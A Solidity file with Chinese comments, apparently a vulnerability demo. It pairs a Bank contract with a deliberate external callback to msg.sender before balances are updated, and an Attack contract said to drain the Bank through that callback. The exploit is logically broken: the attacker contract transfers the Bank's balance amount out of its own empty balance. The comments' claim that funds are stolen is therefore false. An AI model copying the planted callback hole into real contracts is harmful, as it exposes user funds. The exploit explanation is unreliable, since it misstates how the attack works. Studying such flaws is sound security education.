pragma solidity >=0.8.0;

/*
  漏洞名稱：Error in Function Call
  描述：
    在原始的 Bank 合約中，withdraw 函數使用了不正確的函式呼叫，透過低階的 call 調用了錯誤的 function signature
    （"performWithdraw(bool,uint256)"），使得如果 msg.sender 為合約，則可利用自訂的 performWithdraw 函式
    執行惡意操作。此外，在 Attack 合約中，由於 Bank 合約含有 payable fallback（receive）函式，
    在進行合約轉型時必須處理 address 與合約型別的轉換錯誤。以下程式碼已針對該錯誤做出調整。
*/

contract Bank {
    // 狀態變數：記錄每個地址的存款金額
    mapping(address => uint256) public balances;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // deposit 函數：供使用者存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw 函數：供使用者提款
    // 漏洞重點：錯誤地使用了錯誤的函式簽名呼叫外部合約的函式
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // 此處使用錯誤的函式簽名呼叫外部合約
        // 當 msg.sender 為合約時，該合約若實現 performWithdraw(bool,uint256) 將可被觸發執行惡意操作
        (bool success, ) = msg.sender.call(abi.encodeWithSignature("performWithdraw(bool,uint256)", false, _amount));
        require(success, "Call failed");

        // 正常提款流程
        balances[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }

    // 內部示意函式，本合約中不對外提供，但用來說明原始意圖
    function performWithdraw(uint256 _amount) public {
        // 正常的提款處理邏輯
    }

    // 定義接收 ETH 的 fallback 函式
    receive() external payable {}
}

/*
  攻擊合約：Attack
  攻擊者部署此合約後，存入少量資金，再呼叫 withdraw
  因 Bank 合約錯誤地進行函式呼叫，使得本合約中對應的 performWithdraw 被觸發，
  從而可竊取 Bank 合約中的資金。
  
  漏洞修正前的 Attack 合約在將 _bank 地址轉型成合約型別時因 payable 與 non-payable 的轉換錯誤，
  因此我們修正構造器參數型別為 address payable，以符合 Solidity 的要求。
*/

contract Attack {
    Bank public bank;
    address public attacker;

    // 修改此參數為 address payable 解決轉型時的錯誤
    constructor(address payable _bank) {
        bank = Bank(_bank);
        attacker = msg.sender;
    }

    // 實作錯誤簽名的函式
    // 當 Bank.withdraw 呼叫 msg.sender.call(abi.encodeWithSignature(...)) 時會執行此函式
    function performWithdraw(bool _flag, uint256 _amount) public {
        // 攻擊邏輯：直接將 Bank 合約的全部資金轉到攻擊者地址
        payable(attacker).transfer(address(bank).balance);
    }

    // 攻擊入口函式
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        // 先存入少量 ETH
        bank.deposit{value: msg.value}();
        // 呼叫 withdraw，觸發低階呼叫中的錯誤函式呼叫
        bank.withdraw(msg.value);
    }

    // 接收 ETH
    receive() external payable {}
}
